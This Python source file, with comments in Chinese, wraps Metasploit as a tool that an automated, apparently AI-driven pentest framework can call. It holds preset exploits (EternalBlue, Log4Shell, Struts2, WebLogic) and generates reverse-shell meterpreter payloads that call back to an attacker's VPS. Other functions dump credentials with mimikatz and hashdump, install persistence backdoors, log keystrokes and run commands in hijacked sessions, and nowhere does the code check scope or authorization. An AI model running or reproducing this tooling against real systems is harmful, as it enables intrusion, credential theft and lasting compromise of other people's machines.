# tools/msf_tool.py
"""
Metasploit Framework 完整封装 (CTF/内网渗透优化版)

功能模块:
1. 信息收集类 (Auxiliary) - 端口扫描、漏洞探测
2. 漏洞利用类 (Exploit) - MS17-010、Struts2、ThinkPHP等
3. 攻击载荷类 (Payload) - reverse_tcp、bind_tcp、meterpreter
4. 后渗透类 (Post) - 提权、凭据获取、信息收集
5. 会话管理 (Session) - 持久性交互、命令执行

CTF场景优化:
- 预设常用模块
- 自动参数填充
- 一键利用链
- 会话持久化管理
"""
import os
import re
import json
import shutil
import subprocess
import tempfile
import time
from typing import Dict, Any, Optional, List
from tool_framework import CommandLineTool


class MetasploitTool(CommandLineTool):
    """Metasploit Framework 完整封装"""

    # ==================== 信息收集模块 ====================
    AUXILIARY_MODULES = {
        # SMB扫描
        "smb_ms17_010": {
            "module": "auxiliary/scanner/smb/smb_ms17_010",
            "description": "永恒之蓝漏洞探测",
            "params": ["RHOSTS"],
            "priority": 5
        },
        "smb_version": {
            "module": "auxiliary/scanner/smb/smb_version",
            "description": "SMB版本识别",
            "params": ["RHOSTS"],
            "priority": 4
        },
        # 端口扫描
        "portscan_tcp": {
            "module": "auxiliary/scanner/portscan/tcp",
            "description": "TCP端口扫描",
            "params": ["RHOSTS", "PORTS"],
            "priority": 4
        },
        "portscan_syn": {
            "module": "auxiliary/scanner/portscan/syn",
            "description": "SYN端口扫描(需root)",
            "params": ["RHOSTS", "PORTS"],
            "priority": 4
        },
        # 服务识别
        "ssh_version": {
            "module": "auxiliary/scanner/ssh/ssh_version",
            "description": "SSH版本识别",
            "params": ["RHOSTS"],
            "priority": 3
        },
        "http_dir_scanner": {
            "module": "auxiliary/scanner/http/dir_scanner",
            "description": "Web目录扫描",
            "params": ["RHOSTS", "PATH"],
            "priority": 3
        },
        # 弱口令爆破
        "mssql_login": {
            "module": "auxiliary/scanner/mssql/mssql_login",
            "description": "MSSQL弱口令爆破",
            "params": ["RHOSTS", "USERNAME", "PASSWORD"],
            "priority": 3
        },
        "ssh_login": {
            "module": "auxiliary/scanner/ssh/ssh_login",
            "description": "SSH弱口令爆破",
            "params": ["RHOSTS", "USERNAME", "PASSWORD"],
            "priority": 3
        },
        "smb_login": {
            "module": "auxiliary/scanner/smb/smb_login",
            "description": "SMB弱口令爆破",
            "params": ["RHOSTS", "USERNAME", "PASSWORD", "DOMAIN"],
            "priority": 3
        },
        # AD域信息收集
        "ldap_enum": {
            "module": "auxiliary/gather/ldap_enum",
            "description": "LDAP域信息枚举",
            "params": ["RHOSTS", "DOMAIN"],
            "priority": 4
        },
    }

    # ==================== 漏洞利用模块 ====================
    EXPLOIT_MODULES = {
        # 永恒之蓝系列
        "ms17_010_eternalblue": {
            "module": "exploit/windows/smb/ms17_010_eternalblue",
            "description": "永恒之蓝 (Win7/2008 R2 64位)",
            "params": ["RHOSTS", "LHOST", "LPORT"],
            "payload": "windows/x64/meterpreter/reverse_tcp",
            "priority": 5
        },
        "ms17_010_psexec": {
            "module": "exploit/windows/smb/ms17_010_psexec",
            "description": "永恒之蓝PsExec (WinXP/2003 32位)",
            "params": ["RHOSTS", "LHOST", "LPORT"],
            "payload": "windows/meterpreter/reverse_tcp",
            "priority": 4
        },
        # 经典漏洞
        "ms08_067_netapi": {
            "module": "exploit/windows/smb/ms08_067_netapi",
            "description": "MS08-067经典漏洞",
            "params": ["RHOSTS", "LHOST", "LPORT"],
            "payload": "windows/meterpreter/reverse_tcp",
            "priority": 4
        },
        # Web漏洞
        "struts2_rest_xstream": {
            "module": "exploit/multi/http/struts2_rest_xstream",
            "description": "Struts2 XStream RCE",
            "params": ["RHOSTS", "TARGETURI"],
            "payload": "linux/x64/meterpreter/reverse_tcp",
            "priority": 3
        },
        "thinkphp_rce": {
            "module": "exploit/linux/http/thinkphp_rce",
            "description": "ThinkPHP远程代码执行",
            "params": ["RHOSTS", "TARGETURI"],
            "payload": "linux/x64/meterpreter/reverse_tcp",
            "priority": 3
        },
        # Log4Shell
        "log4shell_jndi": {
            "module": "exploit/multi/http/log4shell_jndi_injection",
            "description": "Log4Shell JNDI注入",
            "params": ["RHOSTS", "RHOSTS", "LHOST"],
            "payload": "java/jsp_shell_reverse_tcp",
            "priority": 5
        },
        # Tomcat
        "tomcat_mgr_upload": {
            "module": "exploit/multi/http/tomcat_mgr_upload",
            "description": "Tomcat Manager WAR部署",
            "params": ["RHOSTS", "HttpUsername", "HttpPassword"],
            "payload": "java/jsp_shell_reverse_tcp",
            "priority": 3
        },
        # Jenkins
        "jenkins_cli_deserialize": {
            "module": "exploit/multi/http/jenkins_cli_deserialize",
            "description": "Jenkins CLI反序列化",
            "params": ["RHOSTS"],
            "payload": "java/jsp_shell_reverse_tcp",
            "priority": 3
        },
        # WebLogic
        "weblogic_t3": {
            "module": "exploit/oracle/weblogic_t3_deserialize",
            "description": "WebLogic T3反序列化",
            "params": ["RHOSTS", "LHOST"],
            "payload": "java/jsp_shell_reverse_tcp",
            "priority": 4
        },
    }

    # ==================== 攻击载荷 ====================
    PAYLOADS = {
        # Windows载荷
        "windows_x64_reverse_tcp": {
            "payload": "windows/x64/meterpreter/reverse_tcp",
            "description": "Windows 64位反弹Meterpreter",
            "params": ["LHOST", "LPORT"],
            "priority": 5
        },
        "windows_x86_reverse_tcp": {
            "payload": "windows/meterpreter/reverse_tcp",
            "description": "Windows 32位反弹Meterpreter",
            "params": ["LHOST", "LPORT"],
            "priority": 5
        },
        "windows_bind_tcp": {
            "payload": "windows/meterpreter/bind_tcp",
            "description": "Windows正向连接(目标无法外连)",
            "params": ["LPORT"],
            "priority": 3
        },
        "windows_powershell_reverse": {
            "payload": "windows/x64/meterpreter/reverse_tcp",
            "format": "powershell",
            "description": "PowerShell内存加载",
            "params": ["LHOST", "LPORT"],
            "priority": 4
        },
        # Linux载荷
        "linux_x64_reverse_tcp": {
            "payload": "linux/x64/meterpreter/reverse_tcp",
            "description": "Linux 64位反弹Meterpreter",
            "params": ["LHOST", "LPORT"],
            "priority": 5
        },
        "linux_bind_tcp": {
            "payload": "linux/x64/meterpreter/bind_tcp",
            "description": "Linux正向连接",
            "params": ["LPORT"],
            "priority": 3
        },
        # Web载荷
        "php_reverse_tcp": {
            "payload": "php/meterpreter/reverse_tcp",
            "description": "PHP Meterpreter",
            "params": ["LHOST", "LPORT"],
            "priority": 4
        },
        "jsp_reverse_tcp": {
            "payload": "java/jsp_shell_reverse_tcp",
            "description": "JSP反弹Shell",
            "params": ["LHOST", "LPORT"],
            "priority": 4
        },
        "war_reverse_tcp": {
            "payload": "java/jsp_shell_reverse_tcp",
            "format": "war",
            "description": "WAR包(Tomcat部署)",
            "params": ["LHOST", "LPORT"],
            "priority": 4
        },
        # Shellcode
        "shellcode_windows_x64": {
            "payload": "windows/x64/meterpreter/reverse_tcp",
            "format": "raw",
            "description": "Windows x64 Shellcode",
            "params": ["LHOST", "LPORT"],
            "priority": 3
        },
        "shellcode_linux_x64": {
            "payload": "linux/x64/meterpreter/reverse_tcp",
            "format": "raw",
            "description": "Linux x64 Shellcode",
            "params": ["LHOST", "LPORT"],
            "priority": 3
        },
    }

    # ==================== 后渗透模块 ====================
    POST_MODULES = {
        # 信息收集
        "checkvm": {
            "module": "post/windows/gather/checkvm",
            "description": "检测是否为虚拟机",
            "priority": 4
        },
        "enum_logged_on_users": {
            "module": "post/windows/gather/enum_logged_on_users",
            "description": "枚举登录用户",
            "priority": 4
        },
        "enum_applications": {
            "module": "post/windows/gather/enum_applications",
            "description": "获取已安装软件",
            "priority": 3
        },
        "enum_patches": {
            "module": "post/windows/gather/enum_patches",
            "description": "获取补丁信息(提权关键)",
            "priority": 5
        },
        "enum_network": {
            "module": "post/windows/gather/enum_network",
            "description": "网络配置信息",
            "priority": 3
        },
        # 提权
        "local_exploit_suggester": {
            "module": "post/multi/recon/local_exploit_suggester",
            "description": "自动检测提权漏洞",
            "priority": 5
        },
        "bypassuac": {
            "module": "exploit/windows/local/bypassuac",
            "description": "绕过UAC提权",
            "priority": 4
        },
        "bypassuac_eventvwr": {
            "module": "exploit/windows/local/bypassuac_eventvwr",
            "description": "UAC绕过(eventvwr)",
            "priority": 4
        },
        # 凭据获取
        "hashdump": {
            "module": "post/windows/gather/hashdump",
            "description": "获取SAM哈希(SYSTEM权限)",
            "priority": 5
        },
        "mimikatz": {
            "module": "post/windows/gather/credentials/mimikatz",
            "description": "Mimikatz获取明文密码",
            "priority": 5
        },
        "cachedump": {
            "module": "post/windows/gather/cachedump",
            "description": "获取域缓存凭据",
            "priority": 4
        },
        "gpp": {
            "module": "post/windows/gather/credentials/gpp",
            "description": "GPP密码提取",
            "priority": 4
        },
        # 持久化
        "enable_rdp": {
            "module": "post/windows/manage/enable_rdp",
            "description": "启用远程桌面",
            "priority": 3
        },
        "migrate": {
            "module": "post/windows/manage/migrate",
            "description": "迁移进程到稳定进程",
            "priority": 4
        },
        "persistent_powershell": {
            "module": "exploit/windows/local/persistence",
            "description": "安装持久化后门",
            "priority": 3
        },
        # 网络信息
        "enum_shares": {
            "module": "post/windows/gather/enum_shares",
            "description": "枚举共享",
            "priority": 3
        },
        "arp_scanner": {
            "module": "post/multi/gather/arp_scanner",
            "description": "ARP扫描内网",
            "priority": 4
        },
        "route_add": {
            "module": "post/multi/manage/autoroute",
            "description": "添加路由(内网跳板)",
            "priority": 4
        },
        # Linux后渗透
        "linux_enum_system": {
            "module": "post/linux/gather/enum_system",
            "description": "Linux系统信息枚举",
            "priority": 4
        },
        "linux_checkvm": {
            "module": "post/linux/gather/checkvm",
            "description": "Linux虚拟机检测",
            "priority": 3
        },
    }

    # ==================== Meterpreter命令 ====================
    METERPRETER_COMMANDS = {
        "sysinfo": "系统信息",
        "getuid": "获取当前用户",
        "ps": "进程列表",
        "migrate": "进程迁移",
        "execute": "执行命令",
        "shell": "进入交互shell",
        "download": "下载文件",
        "upload": "上传文件",
        "portfwd": "端口转发",
        "run_auto": "运行自动化脚本",
        "hashdump": "导出哈希",
        "load_mimikatz": "加载mimikatz",
        "screenshot": "截屏",
        "keyscan_start": "开始键盘记录",
        "keyscan_dump": "获取键盘记录",
        "getsystem": "尝试获取SYSTEM权限",
    }

    def __init__(self):
        self.executable = self._find_msfconsole()
        self.msfvenom = self._find_msfvenom()
        super().__init__(self.executable or "msfconsole")
        self.timeout = 300
        self.sessions_file = "/app/data/msf_sessions.json"

    def _find_msfconsole(self) -> Optional[str]:
        """查找msfconsole"""
        msf = shutil.which("msfconsole")
        if msf:
            return msf

        common_paths = [
            "/usr/bin/msfconsole",
            "/usr/local/bin/msfconsole",
            "/opt/metasploit-framework/bin/msfconsole",
        ]
        for path in common_paths:
            if os.path.exists(path):
                return path
        return None

    def _find_msfvenom(self) -> Optional[str]:
        """查找msfvenom"""
        msfvenom = shutil.which("msfvenom")
        if msfvenom:
            return msfvenom

        common_paths = [
            "/usr/bin/msfvenom",
            "/usr/local/bin/msfvenom",
            "/opt/metasploit-framework/bin/msfvenom",
        ]
        for path in common_paths:
            if os.path.exists(path):
                return path
        return None

    def name(self) -> str:
        return "msf"

    def description(self) -> str:
        return "Metasploit Framework完整封装，支持漏洞探测、利用、载荷生成、后渗透操作、会话管理"

    def supported_vulns(self) -> list:
        return [
            "MS17-010", "MS08-067", "Struts2", "ThinkPHP", "Log4Shell",
            "Tomcat", "WebLogic", "Jenkins", "Privilege Escalation",
            "Credential Dumping", "Reverse Shell", "Bind Shell",
            "Meterpreter", "Internal Network", "Lateral Movement",
            "Session Management", "Persistence"
        ]

    def capability_statement(self) -> str:
        return ("Metasploit框架。支持永恒之蓝/Log4Shell/Struts2等漏洞利用，生成各平台反弹shell/meterpreter，"
                "后渗透提权/凭据获取/内网扫描。支持持久性会话交互。适合：CTF内网渗透、漏洞验证、横向移动。")

    def check_available(self) -> bool:
        if not self.executable:
            return False
        try:
            result = subprocess.run(
                [self.executable, "--version"],
                capture_output=True, timeout=10
            )
            return result.returncode == 0
        except Exception:
            return False

    def expected_params(self) -> Dict[str, Dict[str, Any]]:
        return {
            "action": {
                "type": "str",
                "description": "操作: scan/exploit/payload/post/handler/session/exec/list",
                "required": True
            },
            "module": {
                "type": "str",
                "description": "模块名称或预设(如 ms17_010_eternalblue)",
                "required": False
            },
            "rhosts": {
                "type": "str",
                "description": "目标IP/网段",
                "required": False
            },
            "lhost": {
                "type": "str",
                "description": "回调地址(VPS公网IP)",
                "required": False
            },
            "lport": {
                "type": "int",
                "description": "回调端口",
                "required": False,
                "default": 4444
            },
            "session": {
                "type": "int",
                "description": "Meterpreter会话ID",
                "required": False
            },
            "command": {
                "type": "str",
                "description": "Meterpreter命令(用于exec操作)",
                "required": False
            }
        }

    def execute(self, target: str, params: Dict) -> Dict:
        if not self.check_available():
            return {
                "success": False,
                "error": "Metasploit未安装",
                "install": "apt install metasploit-framework"
            }

        action = params.get("action", "list")

        if action == "list":
            return self._list_modules()
        elif action == "scan":
            return self._run_auxiliary(params)
        elif action == "exploit":
            return self._run_exploit(params)
        elif action == "payload":
            return self._generate_payload(params)
        elif action == "post":
            return self._run_post(params)
        elif action == "handler":
            return self._start_handler(params)
        elif action == "session":
            return self._session_action(params)
        elif action == "exec":
            return self._session_exec(params)
        else:
            return {"success": False, "error": f"未知操作: {action}"}

    # ==================== 模块列表 ====================

    def _list_modules(self) -> Dict:
        """列出所有可用模块"""
        return {
            "success": True,
            "auxiliary": {k: {"module": v["module"], "description": v["description"]}
                          for k, v in self.AUXILIARY_MODULES.items()},
            "exploits": {k: {"module": v["module"], "description": v["description"], "payload": v.get("payload")}
                         for k, v in self.EXPLOIT_MODULES.items()},
            "payloads": {k: {"payload": v["payload"], "description": v["description"]}
                         for k, v in self.PAYLOADS.items()},
            "post": {k: {"module": v["module"], "description": v["description"]}
                     for k, v in self.POST_MODULES.items()},
            "meterpreter_commands": self.METERPRETER_COMMANDS
        }

    # ==================== 信息收集 ====================

    def _run_auxiliary(self, params: Dict) -> Dict:
        """运行信息收集模块"""
        module_name = params.get("module")
        rhosts = params.get("rhosts")

        if not module_name:
            return {"success": False, "error": "必须指定module参数"}

        if module_name not in self.AUXILIARY_MODULES:
            return {"success": False, "error": f"未知模块: {module_name}",
                    "available": list(self.AUXILIARY_MODULES.keys())}

        module_info = self.AUXILIARY_MODULES[module_name]
        module_path = module_info["module"]

        # 构建rc脚本
        rc_content = f"""
use {module_path}
set RHOSTS {rhosts}
"""

        # 添加可选参数
        if params.get("ports"):
            rc_content += f"set PORTS {params['ports']}\n"
        if params.get("username"):
            rc_content += f"set USERNAME {params['username']}\n"
        if params.get("password"):
            rc_content += f"set PASSWORD {params['password']}\n"
        if params.get("domain"):
            rc_content += f"set DOMAIN {params['domain']}\n"

        rc_content += """
run
exit -y
"""
        return self._execute_rc(rc_content, f"auxiliary/{module_name}")

    # ==================== 漏洞利用 ====================

    def _run_exploit(self, params: Dict) -> Dict:
        """运行漏洞利用模块"""
        module_name = params.get("module")
        rhosts = params.get("rhosts")
        lhost = params.get("lhost")
        lport = params.get("lport", 4444)

        if not module_name:
            return {"success": False, "error": "必须指定module参数"}

        if module_name not in self.EXPLOIT_MODULES:
            return {"success": False, "error": f"未知模块: {module_name}",
                    "available": list(self.EXPLOIT_MODULES.keys())}

        module_info = self.EXPLOIT_MODULES[module_name]
        module_path = module_info["module"]
        payload = module_info.get("payload", "")

        # 构建rc脚本
        rc_content = f"""
use {module_path}
set RHOSTS {rhosts}
"""

        if lhost and payload:
            rc_content += f"""
set LHOST {lhost}
set LPORT {lport}
set PAYLOAD {payload}
"""

        # 添加可选参数
        if params.get("targeturi"):
            rc_content += f"set TARGETURI {params['targeturi']}\n"
        if params.get("httpusername"):
            rc_content += f"set HttpUsername {params['httpusername']}\n"
        if params.get("httppassword"):
            rc_content += f"set HttpPassword {params['httppassword']}\n"

        # 后台运行，保持会话
        rc_content += """
run -z
exit -y
"""
        result = self._execute_rc(rc_content, f"exploit/{module_name}")

        # 添加会话管理提示
        result["session_hint"] = {
            "list_sessions": "msfconsole -x 'sessions -l'",
            "interact": "msfconsole -x 'sessions -i <session_id>'",
            "execute_command": "msfconsole -x 'sessions -i <session_id> -c \"sysinfo\"'"
        }

        return result

    # ==================== 载荷生成 ====================

    def _generate_payload(self, params: Dict) -> Dict:
        """生成攻击载荷"""
        payload_name = params.get("module", "windows_x64_reverse_tcp")
        lhost = params.get("lhost")
        lport = params.get("lport", 4444)
        output_format = params.get("format", "exe")
        out_file = params.get("out_file")
        encoder = params.get("encoder")
        iterations = params.get("iterations", 1)

        if not lhost:
            return {"success": False, "error": "必须指定lhost(VPS公网IP)"}

        if payload_name not in self.PAYLOADS:
            return {"success": False, "error": f"未知载荷: {payload_name}",
                    "available": list(self.PAYLOADS.keys())}

        payload_info = self.PAYLOADS[payload_name]
        payload = payload_info["payload"]
        fmt = payload_info.get("format", output_format)

        # 使用msfvenom生成载荷
        msfvenom = self.msfvenom or "msfvenom"
        cmd = [msfvenom, "-p", payload, f"LHOST={lhost}", f"LPORT={lport}", "-f", fmt]

        if encoder:
            cmd.extend(["-e", encoder])
            if iterations > 1:
                cmd.extend(["-i", str(iterations)])

        if out_file:
            os.makedirs("/app/data", exist_ok=True)
            out_path = f"/app/data/{out_file}"
            cmd.extend(["-o", out_path])
        else:
            out_path = None

        try:
            result = subprocess.run(cmd, capture_output=True, timeout=60)
            if result.returncode != 0:
                return {"success": False, "error": result.stderr.decode()}

            output = result.stdout

            return {
                "success": True,
                "payload": payload,
                "format": fmt,
                "lhost": lhost,
                "lport": lport,
                "encoder": encoder,
                "iterations": iterations,
                "size": len(output),
                "saved_to": out_path,
                "output_preview": output[:500].decode('latin-1', errors='replace') if len(output) > 500 else output.decode('latin-1', errors='replace'),
                "handler_command": f"msfconsole -x 'use exploit/multi/handler; set payload {payload}; set LHOST {lhost}; set LPORT {lport}; run'",
                "listener_rc": f"""
use exploit/multi/handler
set PAYLOAD {payload}
set LHOST {lhost}
set LPORT {lport}
run
"""
            }
        except Exception as e:
            return {"success": False, "error": str(e)}

    # ==================== 后渗透 ====================

    def _run_post(self, params: Dict) -> Dict:
        """运行后渗透模块"""
        module_name = params.get("module")
        session_id = params.get("session")

        if not module_name:
            return {"success": False, "error": "必须指定module参数"}

        if module_name not in self.POST_MODULES:
            return {"success": False, "error": f"未知模块: {module_name}",
                    "available": list(self.POST_MODULES.keys())}

        module_info = self.POST_MODULES[module_name]
        module_path = module_info["module"]

        # 构建rc脚本
        rc_content = f"""
use {module_path}
"""
        if session_id:
            rc_content += f"set SESSION {session_id}\n"

        # 添加可选参数
        if params.get("newname"):
            rc_content += f"set NEWNAME {params['newname']}\n"

        rc_content += """
run
exit -y
"""
        return self._execute_rc(rc_content, f"post/{module_name}")

    # ==================== 监听器 ====================

    def _start_handler(self, params: Dict) -> Dict:
        """启动监听器"""
        handler_type = params.get("module", "windows_reverse_tcp")
        lhost = params.get("lhost", "0.0.0.0")
        lport = params.get("lport", 4444)
        payload = params.get("payload")

        if not payload:
            if handler_type in ["windows_reverse_tcp", "windows_x64_reverse_tcp"]:
                payload = "windows/x64/meterpreter/reverse_tcp"
            elif handler_type == "linux_reverse_tcp":
                payload = "linux/x64/meterpreter/reverse_tcp"
            elif handler_type == "php_reverse_tcp":
                payload = "php/meterpreter/reverse_tcp"
            else:
                payload = "windows/x64/meterpreter/reverse_tcp"

        # 生成监听器RC脚本 - 后台运行
        rc_content = f"""
use exploit/multi/handler
set PAYLOAD {payload}
set LHOST {lhost}
set LPORT {lport}
set ExitOnSession false
run -j
"""

        # 保存handler配置
        handler_config = {
            "payload": payload,
            "lhost": lhost,
            "lport": lport,
            "created_at": time.strftime("%Y-%m-%d %H:%M:%S")
        }

        return {
            "success": True,
            "handler_config": handler_config,
            "rc_script": rc_content,
            "start_command": f"msfconsole -q -x '{rc_content.strip()}'",
            "background_command": f"nohup msfconsole -q -x '{rc_content.strip()}' &",
            "notes": [
                "监听器将在后台运行",
                "使用 'sessions -l' 查看连接的会话",
                "使用 'sessions -i <id>' 与会话交互"
            ]
        }

    # ==================== 会话管理 ====================

    def _session_action(self, params: Dict) -> Dict:
        """会话管理操作"""
        sub_action = params.get("sub_action", "list")
        session_id = params.get("session")

        if sub_action == "list":
            # 列出所有会话
            rc_content = """
sessions -l
exit -y
"""
            result = self._execute_rc(rc_content, "session/list")
            # 解析会话列表
            sessions = self._parse_sessions(result.get("output", ""))
            result["sessions"] = sessions
            return result

        elif sub_action == "info" and session_id:
            # 获取会话信息
            rc_content = f"""
sessions -i {session_id} -c "sysinfo"
sessions -i {session_id} -c "getuid"
exit -y
"""
            return self._execute_rc(rc_content, f"session/{session_id}/info")

        elif sub_action == "kill" and session_id:
            # 终止会话
            rc_content = f"""
sessions -k {session_id}
exit -y
"""
            return self._execute_rc(rc_content, f"session/{session_id}/kill")

        elif sub_action == "upgrade" and session_id:
            # 升级到Meterpreter
            lhost = params.get("lhost", "0.0.0.0")
            lport = params.get("lport", 4445)
            rc_content = f"""
sessions -u {session_id}
exit -y
"""
            return self._execute_rc(rc_content, f"session/{session_id}/upgrade")

        return {"success": False, "error": "需要指定sub_action: list/info/kill/upgrade"}

    def _session_exec(self, params: Dict) -> Dict:
        """在会话中执行命令"""
        session_id = params.get("session")
        command = params.get("command")

        if not session_id:
            return {"success": False, "error": "必须指定session参数"}
        if not command:
            return {"success": False, "error": "必须指定command参数"}

        # 构建执行脚本
        rc_content = f"""
sessions -i {session_id} -c "{command}"
exit -y
"""
        result = self._execute_rc(rc_content, f"session/{session_id}/exec")
        result["session_id"] = session_id
        result["command"] = command
        return result

    def _parse_sessions(self, output: str) -> List[Dict]:
        """解析会话列表"""
        sessions = []

        # 匹配会话行
        # 格式: Id  Name  Type         Information  Connection
        pattern = re.compile(
            r'(\d+)\s+(\S+)\s+(meterpreter|shell)\s+(\S+)\s+\((\S+)\s+->\s+(\S+)\)'
        )

        for match in pattern.finditer(output):
            sessions.append({
                "id": int(match.group(1)),
                "name": match.group(2),
                "type": match.group(3),
                "info": match.group(4),
                "local_addr": match.group(5),
                "remote_addr": match.group(6)
            })

        return sessions

    # ==================== RC脚本执行 ====================

    def _execute_rc(self, rc_content: str, module_name: str) -> Dict:
        """执行RC脚本"""
        os.makedirs("/app/data", exist_ok=True)
        rc_path = f"/app/data/msf_{int(time.time())}.rc"

        try:
            with open(rc_path, 'w') as f:
                f.write(rc_content)

            cmd = [self.executable, "-q", "-r", rc_path]
            result = self._run_command(cmd, timeout=self.timeout, stream_output=True)

            return {
                "success": result.get("returncode", 0) == 0,
                "module": module_name,
                "output": result.get("stdout", ""),
                "error": result.get("stderr", ""),
                "rc_file": rc_path
            }
        except Exception as e:
            return {"success": False, "error": str(e)}
        finally:
            # 清理RC文件
            try:
                if os.path.exists(rc_path):
                    os.unlink(rc_path)
            except:
                pass

    # ==================== 快捷方法 ====================

    def scan_ms17_010(self, target: str) -> Dict:
        """快速扫描永恒之蓝漏洞"""
        return self._run_auxiliary({"module": "smb_ms17_010", "rhosts": target})

    def exploit_ms17_010(self, target: str, lhost: str, lport: int = 4444) -> Dict:
        """利用永恒之蓝"""
        return self._run_exploit({
            "module": "ms17_010_eternalblue",
            "rhosts": target,
            "lhost": lhost,
            "lport": lport
        })

    def generate_windows_shell(self, lhost: str, lport: int = 4444) -> Dict:
        """生成Windows反弹Shell"""
        return self._generate_payload({
            "module": "windows_x64_reverse_tcp",
            "lhost": lhost,
            "lport": lport,
            "format": "exe"
        })

    def generate_php_shell(self, lhost: str, lport: int = 4444) -> Dict:
        """生成PHP反弹Shell"""
        return self._generate_payload({
            "module": "php_reverse_tcp",
            "lhost": lhost,
            "lport": lport,
            "format": "php"
        })

    def suggest_priv_esc(self, session_id: int) -> Dict:
        """自动检测提权漏洞"""
        return self._run_post({"module": "local_exploit_suggester", "session": session_id})

    def dump_credentials(self, session_id: int) -> Dict:
        """获取凭据"""
        return self._run_post({"module": "mimikatz", "session": session_id})

    def list_sessions(self) -> Dict:
        """列出所有会话"""
        return self._session_action({"sub_action": "list"})

    def exec_in_session(self, session_id: int, command: str) -> Dict:
        """在会话中执行命令"""
        return self._session_exec({"session": session_id, "command": command})


def register():
    from tool_framework import ToolRegistry
    ToolRegistry.register(MetasploitTool())